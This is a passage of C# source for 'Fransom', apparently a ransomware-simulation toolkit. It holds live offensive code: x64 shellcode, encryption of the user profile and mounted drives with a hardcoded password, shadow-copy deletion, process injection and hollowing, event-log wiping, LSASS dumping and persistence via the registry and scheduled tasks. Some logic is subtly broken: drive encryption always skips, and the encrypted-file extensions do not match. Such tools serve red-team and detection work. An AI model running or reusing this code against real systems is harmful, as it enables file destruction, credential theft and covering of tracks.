using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using CommandLine;
using CommandLine.Text;
using System.Threading;
using Figgle;

namespace Fransom
{
    class Program
    {
        private const bool SensitiveData = true;
        ///*// uncomment for calc.exe
        private static byte[] ShellCode = new byte[112] { 0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xe4, 0xf0, 0x50, 0x6a, 0x60, 0x5a, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x54, 0x59, 0x48, 0x29, 0xd4, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76, 0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48, 0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x57, 0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f, 0x20, 0x48, 0x01, 0xfe, 0x8b, 0x54, 0x1f, 0x24, 0x0f, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x02, 0xad, 0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75, 0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x01, 0xfe, 0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x99, 0xff, 0xd7, 0x48, 0x83, 0xc4, 0x68, 0x5c, 0x5d, 0x5f, 0x5e, 0x5b, 0x5a, 0x59, 0x58, 0xc3 };
        //*/

        [DllImport("mpr.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern int WNetGetConnection(
        [MarshalAs(UnmanagedType.LPTStr)] string localName,
        [MarshalAs(UnmanagedType.LPTStr)] StringBuilder remoteName,
        ref int length);

        class Options
        {
            [Option("enumerate-user-profile", HelpText = "List all files and folders under the current user profile.", Group = "arguments")]
            public bool EnumerateUserProfile { get; set; }
            [Option("encrypt-user-profile", HelpText = "Encrypt all files (recursively) under the current user profile.", Group = "arguments")]
            public bool EncryptUserProfile { get; set; }
            [Option("decrypt-user-profile", HelpText = "Decrypt all encrypted files (recursively) under the current user profile.", Group = "arguments")]
            public bool DecryptUserProfile { get; set; }
            [Option("create-local-dummy-data", HelpText = "Create a folder named 'Fransom' on the user Desktop with dummy data, encrypt and delete them.", Group = "arguments")]
            public bool CreateLocalDummyData { get; set; }
            [Option("cleanup-user-profile", HelpText = "Remove all encrypted / decrypted files under the user profile generated by Fransom.", Group = "arguments")]
            public bool CleanupUserProfile { get; set; }
            [Option("enumerate-mounted-drives", HelpText = "List mounted drives, including potential network shares.", Group = "arguments")]
            public bool EnumerateMountedDrives { get; set; }
            [Option("encrypt-mounted-drives", HelpText = "Encrypt the content of mounted drives (recursively, excluding the OS disk), including potential network shares.", Group = "arguments")]
            public bool EncryptMountedDrives { get; set; }
            [Option("decrypt-mounted-drives", HelpText = "Decrypt all encrypted files in mounted drives (recursively, excluding the OS disk), including potential network shares.", Group = "arguments")]
            public bool DecryptMountedDrives { get; set; }
            [Option("create-mounted-drives-dummy-data", HelpText = "Create a folder named 'Fransom' on each mounted drives (excluding the OS disk) with dummy data, encrypt and delete them.", Group = "arguments")]
            public bool CreateMountedDrivesDummyData { get; set; }
            [Option("cleanup-mounted-drives", HelpText = "Remove all encrypted / decrypted files in mounted drives generated by Fransom.", Group = "arguments")]
            public bool CleanupMountedDrives { get; set; }
            [Option("enumerate-shadow-copies", HelpText = "(Requires Admin privileges) List all available shadow copies.", Group = "arguments")]
            public bool EnumerateShadowCopies { get; set; }
            [Option("delete-shadow-copies", HelpText = "(Requires Admin privileges) Create a dummy shadow copy and deletes it.", Group = "arguments")]
            public bool DeleteShadowCopies { get; set; }
            [Option("net-assembly-injection", HelpText = "(Requires FransomDLL.dll file to be located in the same directory as the program executable) Injects a pre-compiled .NET assembly in memory that will execute the same function as 'create-local-dummy-data'.", Group = "arguments")]
            public bool NetAssemblyInjection { get; set; }
            [Option("kill-office-applications", HelpText = "Terminates all open office processes.", Group = "arguments")]
            public bool KillOfficeApplications { get; set; }
            [Option("thread-inject", HelpText = "Inject a thread into a running process.", Group = "arguments")]
            public int ThreadInject { get; set; }
            [Option("apc-inject", HelpText = "APC injection into any process. Give PID as parameter", Group = "arguments")]
            public int APCInject { get; set; }
            [Option("apc-inject-new-process", HelpText = "APC injection into a process (notepad.exe).", Group = "arguments")]
            public bool APCInjectNewProcess { get; set; }
            [Option("remote-thread", HelpText = "Process injection with CreateRemoteThread. Give PID as parameter", Group = "arguments")]
            public int RemoteThread { get; set; }
            [Option("process-hollowing", HelpText = "Execute simple Process Hollowing with calc.exe", Group = "arguments")]
            public bool ProcessHollowing { get; set; }
            [Option("delete-eventlogs", HelpText = "Delete event logs from the local machine.", Group = "arguments")]
            public bool DeleteLogs { get; set; }
            [Option("dump-lsass", HelpText = "Dump LSASS process memory.", Group = "arguments")]
            public bool DumpLsass { get; set; }
            [Option("userregkey", HelpText = "Persistence via registry run key.", Group = "arguments")]
            public bool UserRegKey { get; set; }
            [Option("userregkey-clean", HelpText = "Clear registry persistence.", Group = "arguments")]
            public bool UserRegKeyClear { get; set; }
            [Option("scheduled-task", HelpText = "Persistence via new Scheduled Task.", Group = "arguments")]
            public bool ScheduledTask { get; set; }
            [Option("scheduled-task-clean", HelpText = "Clean Scheduled Task persistence.", Group = "arguments")]
            public bool ScheduledTaskClean { get; set; }
            [Option("ps", HelpText = "Helper: List running processes.", Group = "arguments")]
            public bool ListProcesses { get; set; }
            [Option("domain-users", HelpText = "List domain users.", Group = "arguments")]
            public bool EnumDomainUsers { get; set; }
            [Option("domain-groups", HelpText = "List domain groups.", Group = "arguments")]
            public bool EnumDomainGroups { get; set; }
            [Option("domain-computers", HelpText = "List domain computers.", Group = "arguments")]
            public bool EnumDomainComputers { get; set; }
            [Option("domain-trusts", HelpText = "List domain trusts", Group = "arguments")]
            public bool EnumDomainTrusts { get; set; }
            [Option("shell", HelpText = "Drop into an interactive shell", Group = "arguments")]
            public bool Shell { get; set; }
        }

        public static string password = "a1b2c3d4e5f6";

        static void DisplayHelpShell()
        {
            Logger.WriteLine("");
            Logger.WriteLine("enumerate-user-profile\t\t\tList all files and folders under the current user profile.");
            Logger.WriteLine("encrypt-user-profile\t\t\tEncrypt all files (recursively) under the current user profile.");
            Logger.WriteLine("decrypt-user-profile\t\t\tDecrypt all encrypted files (recursively) under the current user profile.");
            Logger.WriteLine("create-local-dummy-data\t\t\tCreate a folder named 'Fransom' on the user Desktop with dummy data, encrypt and delete them.");
            Logger.WriteLine("cleanup-user-profile\t\t\tRemove all encrypted / decrypted files under the user profile generated by Fransom.");
            Logger.WriteLine("enumerate-mounted-drives\t\tList mounted drives, including potential network shares.");
            Logger.WriteLine("encrypt-mounted-drives\t\t\tEncrypt the content of mounted drives (recursively, excluding the OS disk), including potential network shares.");
            Logger.WriteLine("decrypt-mounted-drives\t\t\tDecrypt all encrypted files in mounted drives (recursively, excluding the OS disk), including potential network shares.");
            Logger.WriteLine("create-mounted-drives-dummy-data\tCreate a folder named 'Fransom' on each mounted drives (excluding the OS disk) with dummy data, encrypt and delete them.");
            Logger.WriteLine("cleanup-mounted-drives\t\t\tRemove all encrypted / decrypted files in mounted drives generated by Fransom.");
            Logger.WriteLine("enumerate-shadow-copies\t\t\t(Requires Admin privileges) List all available shadow copies.");
            Logger.WriteLine("delete-shadow-copies\t\t\t(Requires Admin privileges) Create a dummy shadow copy and deletes it.");
            Logger.WriteLine("net-assembly-injection\t\t\t(Requires FransomDLL.dll file to be located in the same directory as the program executable) Injects a pre-compiled .NET assembly in memory that will execute the same function as 'create-local-dummy-data'.");
            Logger.WriteLine("kill-office-applications\t\tTerminates all open office processes.");
            Logger.WriteLine("thread-inject\t\t\t\tInject a thread into a running process.");
            Logger.WriteLine("apc-inject\t\t\t\tAPC injection into any process. Give PID as parameter");
            Logger.WriteLine("apc-inject-new-process\t\t\tAPC injection into a process (notepad.exe).");
            Logger.WriteLine("remote-thread\t\t\t\tProcess injection with CreateRemoteThread. Give PID as parameter");
            Logger.WriteLine("process-hollowing\t\t\tExecute simple Process Hollowing with calc.exe");
            Logger.WriteLine("delete-eventlogs\t\t\tDelete event logs from the local machine.");
            Logger.WriteLine("dump-lsass\t\t\t\tDump LSASS process memory.");
            Logger.WriteLine("userregkey\t\t\t\tPersistence via registry run key.");
            Logger.WriteLine("userregkey-clean\t\t\tClear registry peristence.");
            Logger.WriteLine("scheduled-task\t\t\t\tPersistence via new Scheduled Task.");
            Logger.WriteLine("scheduled-task-clean\t\t\tClean Scheduled Task persistence.");
            Logger.WriteLine("ps\t\t\t\t\tList running processes.");
            Logger.WriteLine("domain-users\t\t\t\tList domain users.");
            Logger.WriteLine("domain-groups\t\t\t\tList domain groups.");
            Logger.WriteLine("domain-computers\t\t\tList domain computers.");
            Logger.WriteLine("domain-trusts\t\t\t\tList domain trusts");
            Logger.WriteLine("exit\t\t\t\t\tExit the interactive shell");
            Logger.WriteLine("");
        }

        static void Main(string[] args)
        {
            var parser = new CommandLine.Parser(with => with.HelpWriter = null);
            var parserResult = parser.ParseArguments<Options>(args);
            parserResult
             .WithParsed<Options>(options => Run(options))
             .WithNotParsed(errs => DisplayHelp(parserResult, errs));
        }

        static void DisplayHelp<T>(ParserResult<T> result, IEnumerable<Error> errs)
        {
            var helpText = HelpText.AutoBuild(result, h =>
            {
                h.AdditionalNewLineAfterOption = false;
                h.Heading = FiggleFonts.Doom.Render("FRANSOM v0.7");
                h.Copyright = "Copyright (c) 2021 Fraktal Ltd.";
                return HelpText.DefaultParsingErrorsHandler(result, h);
            }, e => e);
            Logger.WriteLine(helpText);
        }

        static void Run(Options options)
        {
            var pr = new Program();
            if (options.EnumerateUserProfile)
            {
                pr.EnumerateUserProfile();
            }
            else if (options.EncryptUserProfile)
            {
                pr.EncryptUserProfile();
            }
            else if (options.DecryptUserProfile)
            {
                DecryptUserProfile();
            }
            else if (options.CreateLocalDummyData)
            {
                LocalDummyDataCreation();
            }
            else if (options.CreateMountedDrivesDummyData)
            {
                MountedDrivesDummyDataCreation();
            }
            else if (options.CleanupUserProfile)
            {
                CleanupUserProfile();
            }
            else if (options.EnumerateMountedDrives)
            {
                pr.DoDriveEnumeration();
            }
            else if (options.EncryptMountedDrives)
            {
                pr.DoDriveEncryption();
            }
            else if (options.DecryptMountedDrives)
            {
                DoDriveDecryption();
            }
            else if (options.CleanupMountedDrives)
            {
                DoDriveCleanup();
            }
            else if (options.EnumerateShadowCopies)
            {
                EnumerateShadowCopies();
            }
            else if (options.DeleteShadowCopies)
            {
                pr.DeleteShadowCopies();
            }
            else if (options.NetAssemblyInjection)
            {
                pr.NetAssemblyInjection();
            }
            else if (options.KillOfficeApplications)
            {
                pr.KillOfficeApplications();
            }
            else if (options.ThreadInject > 0)
            {
                pr.DoThreadInjection(options.ThreadInject);
            }
            else if (options.APCInject > 0)
            {
                DoApcInjection(options.APCInject);
            }
            else if (options.APCInjectNewProcess)
            {
                pr.DoApcInjectionNewProcess();
            }
            else if (options.RemoteThread > 0)
            {
                DoRemoteThread(options.RemoteThread);
            }
            if (options.ProcessHollowing)
            {
                var ph = new ProcessHollowing();
                ph.ExecuteProcessHollowing();
            }
            if (options.DeleteLogs)
            {
                foreach (var log in EventLog.GetEventLogs())
                {
                    Logger.WriteLine("Deleting " + log.LogDisplayName);
                    log.Clear();
                    log.Dispose();
                }
                Logger.WriteLine("Done, all event logs gone!");
            }
            if (options.UserRegKey)
            {
                var p = new Persistence();
                p.UserRegKey();
            }
            if (options.UserRegKeyClear)
            {
                var p = new Persistence();
                p.CleanupUserRegKey();
            }
            if (options.ScheduledTask)
            {
                var p = new Persistence();
                p.CreateScheduledTask();
            }
            if (options.ScheduledTaskClean)
            {
                var p = new Persistence();
                p.RemoveScheduledTask();
            }
            if (options.DumpLsass)
            {
                var d = new DumpLSASS();
                d.Run();
            }
            if (options.ListProcesses)
            {
                var e = new Enumerate();
                e.EnumerateProcesses();
            }
            if (options.EnumDomainUsers)
            {
                var e = new Enumerate();
                e.EnumerateDomainUsers();
            }
            if (options.EnumDomainGroups)
            {
                var e = new Enumerate();
                e.EnumerateDomainGroups();
            }
            if (options.EnumDomainComputers)
            {
                var e = new Enumerate();
                e.EnumerateDomainComputers();
            }
            if (options.EnumDomainTrusts)
            {
                var e = new Enumerate();
                e.EnumerateDomainTrusts();
            }
            if (options.Shell)
            {
                InteractiveShell();
            }
        }

        static void InteractiveShell()
        {
            string command = "";
            string line = "";
            int process_id;
            var d = new DumpLSASS();
            var p = new Persistence();
            var e = new Enumerate();
            var pr = new Program();
            var ph = new ProcessHollowing();
            Logger.WriteLine("");
            Logger.WriteLine(FiggleFonts.Doom.Render("FRANSOM v0.7"));
            Logger.WriteLine("Copyright (c) 2021 Fraktal Ltd.");
            Logger.WriteLine("");
            while (command != "exit")
            {
                Logger.Write("FRANSOM> ");
                command = Console.ReadLine();
                Logger.WriteLine("*** Executing command: '" + command + "' ***");
                switch (command)
                {
                    case "log-on":
                        Logger.LogToFile(true);
                        break;
                    case "log-off":
                        Logger.LogToFile(false);
                        break;
                    case "help":
                        DisplayHelpShell();
                        break;
                    case "enumerate-user-profile":
                        pr.EnumerateUserProfile();
                        break;
                    case "encrypt-user-profile":
                        pr.EncryptUserProfile();
                        break;
                    case "decrypt-user-profile":
                        DecryptUserProfile();
                        break;
                    case "create-local-dummy-data":
                        LocalDummyDataCreation();
                        break;
                    case "cleanup-user-profile":
                        CleanupUserProfile();
                        break;
                    case "enumerate-mounted-drives":
                        pr.DoDriveEnumeration();
                        break;
                    case "encrypt-mounted-drives":
                        pr.DoDriveEncryption();
                        break;
                    case "decrypt-mounted-drives":
                        DoDriveDecryption();
                        break;
                    case "create-mounted-drives-dummy-data":
                        MountedDrivesDummyDataCreation();
                        break;
                    case "cleanup-mounted-drives":
                        DoDriveCleanup();
                        break;
                    case "enumerate-shadow-copies":
                        EnumerateShadowCopies();
                        break;
                    case "delete-shadow-copies":
                        pr.DeleteShadowCopies();
                        break;
                    case "net-assembly-injection":
                        pr.NetAssemblyInjection();
                        break;
                    case "kill-office-applications":
                        pr.KillOfficeApplications();
                        break;
                    case "thread-inject":
                        Logger.Write("Enter process ID: ");
                        line = Console.ReadLine();
                        if (int.TryParse(line, out process_id))
                        {
                            pr.DoThreadInjection(process_id);
                        }
                        else
                        {
                            Logger.WriteLine("The value provided is not a valid process id.");
                        }
                        break;
                    case "apc-inject":
                        Logger.Write("Enter process ID: ");
                        line = Console.ReadLine();
                        if (int.TryParse(line, out process_id))
                        {
                            DoApcInjection(process_id);
                        }
                        else
                        {
                            Logger.WriteLine("The value provided is not a valid process id.");
                        }
                        break;
                    case "apc-inject-new-process":
                        pr.DoApcInjectionNewProcess();
                        break;
                    case "remote-thread":
                        Logger.Write("Enter process ID: ");
                        line = Console.ReadLine();
                        if (int.TryParse(line, out process_id))
                        {
                            DoRemoteThread(process_id);
                        }
                        else
                        {
                            Logger.WriteLine("The value provided is not a valid process id.");
                        }
                        break;
                    case "process-hollowing":
                        ph.ExecuteProcessHollowing();
                        break;
                    case "delete-eventlogs":
                        pr.DeleteEventLogs();
                        break;
                    case "dump-lsass":
                        d.Run();
                        break;
                    case "userregkey":
                        p.UserRegKey();
                        break;
                    case "userregkey-clean":
                        p.CleanupUserRegKey();
                        break;
                    case "scheduled-task":
                        p.CreateScheduledTask();
                        break;
                    case "scheduled-task-clean":
                        p.RemoveScheduledTask();
                        break;
                    case "ps":
                        e.EnumerateProcesses();
                        break;
                    case "domain-users":
                        e.EnumerateDomainUsers();
                        break;
                    case "domain-groups":
                        e.EnumerateDomainGroups();
                        break;
                    case "domain-computers":
                        e.EnumerateDomainComputers();
                        break;
                    case "domain-trusts":
                        e.EnumerateDomainTrusts();
                        break;
                    case "domain-shares":
                        e.EnumerateDomainShares();
                        break;
                    case "exit":
                        break;
                    default:
                        Logger.WriteLine("Invalid command - enter \"help\" to list all available options.");
                        break;
                }
            }
        }

        static StringCollection EnumeratePath(StringCollection allFiles, string path, string ext, bool scanDirOk)
        {
            string[] files = Directory.GetFiles(path, ext);
            foreach (string value in files)
            {
                bool flag = !allFiles.Contains(value);
                if (flag)
                {
                    allFiles.Add(value);
                }
            }
            if (scanDirOk)
            {
                string[] directories = Directory.GetDirectories(path);
                bool flag2 = directories.Length != 0;
                if (flag2)
                {
                    foreach (string text in directories)
                    {
                        try
                        {
                            EnumeratePath(allFiles, text, ext, scanDirOk);
                        }
                        catch (UnauthorizedAccessException)
                        {
                            Logger.WriteLine("Access Denied for folder " + text);
                        }
                        catch (Exception e)
                        {
                            Logger.WriteLine("Error: " + e.Message);
                        }
                    }
                }
            }
            return allFiles;
        }

        static void EncryptFile(string inputFileName, string outputFileName, string password)
        {
            try
            {
                FileStream inFile = new FileStream(inputFileName, FileMode.Open, FileAccess.Read);
                FileStream outFile = new FileStream(outputFileName, FileMode.OpenOrCreate, FileAccess.Write);
                RijndaelManaged algorithm = new RijndaelManaged();
                Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(password, Encoding.ASCII.GetBytes("Salt123456"));

                algorithm.Key = key.GetBytes(algorithm.KeySize / 8);
                algorithm.IV = key.GetBytes(algorithm.BlockSize / 8);

                byte[] fileData = new byte[4096];
                CryptoStream encryptedStream = new CryptoStream(outFile, algorithm.CreateEncryptor(), CryptoStreamMode.Write);

                while (inFile.Read(fileData, 0, fileData.Length) != 0)
                {
                    encryptedStream.Write(fileData, 0, fileData.Length);
                }

                encryptedStream.Flush();
                encryptedStream.Close();
                inFile.Close();
                outFile.Close();
            }
            catch (Exception e)
            {
                Logger.WriteLine("Error: " + e.Message);
            }
        }
        static void DecryptFile(string inputFileName, string outputFileName, string password)
        {
            try
            {
                FileStream inFile = new FileStream(inputFileName, FileMode.Open, FileAccess.Read);
                FileStream outFile = new FileStream(outputFileName, FileMode.OpenOrCreate, FileAccess.Write);
                RijndaelManaged algorithm = new RijndaelManaged();
                Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(password, Encoding.ASCII.GetBytes("Salt123456"));

                algorithm.Key = key.GetBytes(algorithm.KeySize / 8);
                algorithm.IV = key.GetBytes(algorithm.BlockSize / 8);

                byte[] fileData = new byte[4096];
                CryptoStream encryptedStream = new CryptoStream(inFile, algorithm.CreateDecryptor(), CryptoStreamMode.Read);

                while (encryptedStream.Read(fileData, 0, fileData.Length) != 0)
                {
                    outFile.Write(fileData, 0, fileData.Length);
                }

                encryptedStream.Flush();
                encryptedStream.Close();
                inFile.Close();
                outFile.Close();
            }
            catch (Exception e)
            {
                Logger.WriteLine("[-] Error: " + e.Message);
            }
        }
        private static string GetUNCPath(string drivePath)
        {
            StringBuilder sb = new StringBuilder(512);
            int size = sb.Capacity;

            if (drivePath.Length > 2 && drivePath[1] == ':')
            {
                char c = drivePath[0];
                if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z'))
                {
                    int error = WNetGetConnection(drivePath.Substring(0, 2),
                        sb, ref size);
                    if (error == 0)
                    {
                        DirectoryInfo dir = new DirectoryInfo(drivePath);

                        string path = Path.GetFullPath(drivePath)
                            .Substring(Path.GetPathRoot(drivePath).Length);
                        return Path.Combine(sb.ToString().TrimEnd(), path);
                    }
                }
            }

            return drivePath;
        }

        public void DoDriveEnumeration()
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();

            foreach (DriveInfo d in allDrives)
            {
                Logger.WriteLine("Drive:" + d.Name);
                Logger.WriteLine("  Drive type: " + d.DriveType);
                if (d.IsReady == true)
                {
                    Logger.WriteLine("  Volume label: " + d.VolumeLabel);
                    Logger.WriteLine("  File system: " + d.DriveFormat);
                    Logger.WriteLine("  UNC path: " + Program.GetUNCPath(d.Name));
                }
            }
        }
        public void DoDriveEncryption()
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();

            foreach (DriveInfo d in allDrives)
            {
                if (d.DriveType != DriveType.Network || d.DriveType != DriveType.Removable)
                {
                    continue;
                }
                string DrivePath = Program.GetUNCPath(d.Name);
                if (DrivePath != "C:\\" && DrivePath != "D:\\")
                {
                    StringCollection stringCollection = new StringCollection();
                    EnumeratePath(stringCollection, DrivePath, "*.*", true);
                    foreach (object obj in stringCollection)
                    {
                        string file_name = obj.ToString();
                        Logger.WriteLine("Encrypting object: " + file_name, SensitiveData);
                        string enc_file = file_name + ".enc";
                        EncryptFile(file_name, enc_file, password);
                    }
                }
            }
        }

        private static byte[] EncryptByteArray(byte[] Payload, byte[] Key, byte[] IV)
        {
            byte[] encrypted;
            using (RijndaelManaged rijAlg = new RijndaelManaged())
            {
                rijAlg.Key = Key;
                rijAlg.IV = IV;
                ICryptoTransform encryptor = rijAlg.CreateEncryptor(rijAlg.Key, rijAlg.IV);
                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {
                            swEncrypt.Write(Payload);
                        }
                        encrypted = msEncrypt.ToArray();
                    }
                }
            }
            return encrypted;
        }

        private static void DoDriveDecryption()
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();

            foreach (DriveInfo d in allDrives)
            {
                string DrivePath = Program.GetUNCPath(d.Name);
                if (DrivePath != "C:\\" && DrivePath != "D:\\")
                {
                    StringCollection stringCollection = new StringCollection();
                    EnumeratePath(stringCollection, DrivePath, "*.*", true);
                    foreach (object obj in stringCollection)
                    {
                        string file_name = obj.ToString();
                        string file_path = @file_name;
                        if (Path.GetExtension(file_path) == ".FRANSOM")
                        {
                            Logger.WriteLine("Decrypting object: " + file_name, SensitiveData);
                            string dec_file = Path.GetDirectoryName(file_name) + "\\" + Path.GetFileNameWithoutExtension(file_name) + ".dec";
                            DecryptFile(file_name, dec_file.ToString(), password);
                        }
                    }
                }
            }
        }
        private static void DoDriveCleanup()
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();

            foreach (DriveInfo d in allDrives)
            {
                string DrivePath = Program.GetUNCPath(d.Name);
                if (DrivePath != "C:\\" && DrivePath != "D:\\")
                {
                    string folder_path = DrivePath + "\\Fransom";
                    if (Directory.Exists(folder_path))
                    {
                        Logger.WriteLine("Found local dummy folder, removing it...");
                        CleanupDummyFolder(folder_path);
                        Logger.WriteLine("Local dummy folder deleted.");
                    }
                    Logger.WriteLine("");
                    StringCollection stringCollection = new StringCollection();
                    EnumeratePath(stringCollection, DrivePath, "*.*", true);
                    foreach (object obj in stringCollection)
                    {
                        string file_name = obj.ToString();
                        string file_path = @file_name;
                        if (Path.GetExtension(file_path) == ".FRANSOM" || Path.GetExtension(file_path) == ".dec")
                        {
                            Logger.WriteLine("Removing object: " + file_name, SensitiveData);
                            File.Delete(file_path);
                        }
                    }
                }
            }
        }
        private static void LocalDummyDataCreation()
        {
            string DirectoryName = Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Desktop\\") + "Fransom";
            Logger.WriteLine("Creating folder: " + DirectoryName);
            Logger.WriteLine("");
            Directory.CreateDirectory(DirectoryName);
            string[] lines = { "First line", "Second line", "Third line" };
            for (int i = 0; i < 10; i++)
            {
                string fileName = DirectoryName + "\\test_file" + i + ".txt";
                Logger.WriteLine("Creating file: " + fileName);
                File.WriteAllLines(fileName, lines);
            }
            Logger.WriteLine("");

            StringCollection stringCollection = new StringCollection();
            EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables(DirectoryName), "*.*", true);
            foreach (object obj in stringCollection)
            {
                try
                {
                    string file_name = obj.ToString();
                    Logger.WriteLine("Encrypting and deleting object: " + file_name);
                    string enc_file = file_name + ".FRANSOM";
                    EncryptFile(file_name, enc_file, password);
                    File.Delete(file_name);
                }
                catch (Exception e)
                {
                    Logger.WriteLine("[-] Error: " + e.Message);
                }
            }

        }
        private static void MountedDrivesDummyDataCreation()
        {

            DriveInfo[] allDrives = DriveInfo.GetDrives();

            foreach (DriveInfo d in allDrives)
            {
                string DrivePath = Program.GetUNCPath(d.Name);
                if (DrivePath != "C:\\" && DrivePath != "D:\\")
                {

                    string DirectoryName = DrivePath + "\\Fransom";
                    Logger.WriteLine("Creating folder: " + DirectoryName);
                    Logger.WriteLine("");
                    Directory.CreateDirectory(DirectoryName);
                    string[] lines = { "First line", "Second line", "Third line" };
                    for (int i = 0; i < 10; i++)
                    {
                        string fileName = DirectoryName + "\\test_file" + i + ".txt";
                        Logger.WriteLine("Creating file: " + fileName);
                        File.WriteAllLines(fileName, lines);
                    }
                    Logger.WriteLine("");
                    StringCollection stringCollection = new StringCollection();
                    EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables(DirectoryName), "*.*", true);
                    foreach (object obj in stringCollection)
                    {
                        string file_name = obj.ToString();
                        Logger.WriteLine("Encrypting and deleting object: " + file_name);
                        string enc_file = file_name + ".FRANSOM";
                        EncryptFile(file_name, enc_file, password);
                        File.Delete(file_name);
                    }
                }
            }
        }
        private static void CleanupDummyFolder(string dummy_folder_path)
        {

            string[] files = Directory.GetFiles(dummy_folder_path);
            string[] dirs = Directory.GetDirectories(dummy_folder_path);

            foreach (string file in files)
            {
                try
                {
                    File.SetAttributes(file, FileAttributes.Normal);
                    File.Delete(file);
                }
                catch (Exception e)
                {
                    Logger.WriteLine("[-] Error: " + e.Message);
                }
            }

            foreach (string dir in dirs)
            {
                CleanupDummyFolder(dir);
            }

            try
            {
                Directory.Delete(dummy_folder_path, false);
            }
            catch (Exception e)
            {
                Logger.WriteLine("[-] Error: " + e.Message);
            }
        }
        private static void EnumerateShadowCopies()
        {
            Process process = new Process();
            process.StartInfo.FileName = "vssadmin.exe";
            process.StartInfo.Arguments = "list shadows";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            Logger.WriteLine(output);
            string err = process.StandardError.ReadToEnd();
            Logger.WriteLine(err);
            process.WaitForExit();
        }
        public static string getBetween(string strSource, string strStart, string strEnd)
        {
            if (strSource.Contains(strStart) && strSource.Contains(strEnd))
            {
                int Start, End;
                Start = strSource.IndexOf(strStart, 0) + strStart.Length;
                End = strSource.IndexOf(strEnd, Start);
                return strSource.Substring(Start, End - Start);
            }

            return "";
        }
        public void DeleteShadowCopies()
        {
            Logger.WriteLine("");
            Logger.WriteLine("Creating a dummy Shadow Copy on volume C:\\");
            Process process_create_sc = new Process();
            process_create_sc.StartInfo.FileName = "wmic.exe";
            process_create_sc.StartInfo.Arguments = "shadowcopy call create Volume='C:\\'";
            process_create_sc.StartInfo.UseShellExecute = false;
            process_create_sc.StartInfo.RedirectStandardOutput = true;
            process_create_sc.StartInfo.RedirectStandardError = true;
            process_create_sc.Start();
            string output = process_create_sc.StandardOutput.ReadToEnd();
            string err = process_create_sc.StandardError.ReadToEnd();
            process_create_sc.WaitForExit();
            string shadow_copy_id = getBetween(output, "ShadowID = \"", "\";");
            Logger.WriteLine("Shadow Copy created successfully with ID: " + shadow_copy_id);
            Logger.WriteLine("");
            Logger.WriteLine("Deleting Shadow Copy with ID: " + shadow_copy_id);
            Process process_delete_sc = new Process();
            process_delete_sc.StartInfo.FileName = "vssadmin.exe";
            process_delete_sc.StartInfo.Arguments = "delete shadows /shadow=\"" + shadow_copy_id + "\" /quiet";
            process_delete_sc.StartInfo.UseShellExecute = false;
            process_delete_sc.StartInfo.RedirectStandardOutput = true;
            process_delete_sc.StartInfo.RedirectStandardError = true;
            process_delete_sc.Start();
            string result = process_delete_sc.StandardOutput.ReadToEnd();
            string excp = process_delete_sc.StandardError.ReadToEnd();
            process_delete_sc.WaitForExit();
            Logger.WriteLine("Shadow Copy with ID: " + shadow_copy_id + " deleted successfully.");
            Logger.WriteLine("");
        }
        public void NetAssemblyInjection()
        {
            string assembly = "FransomDLL.dll";
            var bytes = File.ReadAllBytes(assembly);
            var b64 = Convert.ToBase64String(bytes);
            NetInjection.Inject(b64);
        }
        public void KillOfficeApplications()
        {
            Logger.WriteLine("");
            Logger.WriteLine("Searching for running Office processes...");
            string[] office_apps = { "word", "winword", "excel", "outlook" };
            foreach (string office_app in office_apps)
            {
                foreach (var process in Process.GetProcessesByName(office_app))
                {
                    Logger.WriteLine("Found Office process " + office_app + ".exe, killing it.");
                    process.Kill();
                }
            }
            Logger.WriteLine("");
        }

        public void DoThreadInjection(int pid)
        {
            var t = new ThreadHijack();
            t.Run(pid, ShellCode);
        }

        public static void DoApcInjection(int pid)
        {
            var t = new APCInject();
            t.Run(pid, ShellCode);
        }

        public void DoApcInjectionNewProcess()
        {
            var t = new APCInjectNewProcess();
            t.Run(ShellCode);
        }

        public int FindExplorerPid()
        {
            Process[] explorer_process = Process.GetProcessesByName("explorer");
            int explorer_pid = explorer_process[0].Id;
            return explorer_pid;
        }

        public static void DoRemoteThread(int pid)
        {
            var t = new RemoteThread();
            t.Run(pid, ShellCode);
        }

        public void EnumerateUserProfile()
        {
            StringCollection stringCollection = new StringCollection();
            EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Desktop"), "*.*", true);
            EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Downloads"), "*.*", true);
            EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Documents"), "*.*", true);

            foreach (object obj in stringCollection)
            {
                string text2 = obj.ToString();
                Logger.WriteLine(text2, SensitiveData);
            }
        }

        public void EncryptUserProfile()
        {
            StringCollection stringCollection = new StringCollection();
